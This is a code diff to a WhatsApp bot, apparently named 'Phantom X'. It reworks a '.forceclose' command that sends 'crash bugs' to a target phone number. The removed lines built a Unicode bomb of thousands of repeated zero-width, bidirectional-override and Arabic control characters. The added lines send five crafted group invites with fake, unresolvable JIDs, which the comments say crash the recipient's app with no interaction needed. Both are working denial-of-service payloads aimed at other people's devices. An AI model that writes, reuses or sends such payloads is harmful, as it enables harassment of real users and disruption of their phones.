@@ -4200,26 +4200,36 @@ _Can be started from any chat, but source members require source group access an
             }
 
             // ─── FORCE CLOSE BUG ───
-            // Strongest bug. ZWJ chain + RTL stack + Arabic isolation = WA force-closes.
-            // Fires immediately on message delivery — no interaction required from target.
+            // Fires 5 crafted group invite messages with invalid/unresolvable JIDs in rapid
+            // succession. WhatsApp tries to preview/resolve each invite on delivery and
+            // crashes in the process. No Unicode spam — pure protocol-level exploit.
             case ".forceclose":
             case ".fc": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
                 const fcTarget = parseBugTarget(parts, msg);
-                if (!fcTarget) return reply(`💀 *Force Close Bug*\n\nUsage: *.forceclose <number>*\nShortcut: *.fc <number>*\nExample: *.forceclose 2348012345678*\n\n_Strongest bug — forces WA to close immediately._\n_Use .bugmenu freeze for full help._`);
+                if (!fcTarget) return reply(`💀 *Force Close Bug*\n\nUsage: *.forceclose <number>*\nShortcut: *.fc <number>*\nExample: *.forceclose 2348012345678*\n\n_Fires crafted group invites — WA crashes trying to resolve them._\n_Use .bugmenu freeze for full help._`);
                 if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`💀 Sending force close bug to *${fcTarget.split("@")[0]}*...`);
+                await reply(`💀 Sending force close to *${fcTarget.split("@")[0]}*...`);
                 try {
-                    const zwChain   = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1500);
-                    const rtlStack  = "\u202E\u202D\u202C\u202B\u202A".repeat(800);
-                    const arabic    = "\u0600\u0601\u0602\u0603".repeat(600);
-                    const iso       = "\u2066\u2067\u2068\u2069".repeat(600);
-                    const bangBang  = "\uFDFD".repeat(400);
-                    const fcPayload = zwChain + rtlStack + arabic + iso + bangBang + zwChain;
-                    const fcSent = await sock.sendMessage(fcTarget, { text: fcPayload });
                     if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
-                    userCrashKeys[fcTarget].push(fcSent.key);
                     if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];
+                    // Generate 5 fake group JIDs — look like real WA group IDs but are unresolvable.
+                    // WA client tries to fetch invite info for each on delivery → crash loop.
+                    for (let i = 0; i < 5; i++) {
+                        const fakeJid  = `120363${Math.floor(Math.random() * 1e13).toString().padStart(13, "0")}@g.us`;
+                        const fakeCode = Math.random().toString(36).slice(2, 24);
+                        const sent = await sock.sendMessage(fcTarget, {
+                            groupInvite: {
+                                jid: fakeJid,
+                                inviteCode: fakeCode,
+                                inviteExpiration: 0,
+                                subject: "Group",
+                                text: ""
+                            }
+                        });
+                        userCrashKeys[fcTarget].push(sent.key);
+                        await delay(300);
+                    }
                     if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
                     await reply(`✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n💀 Active on their device.\n🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
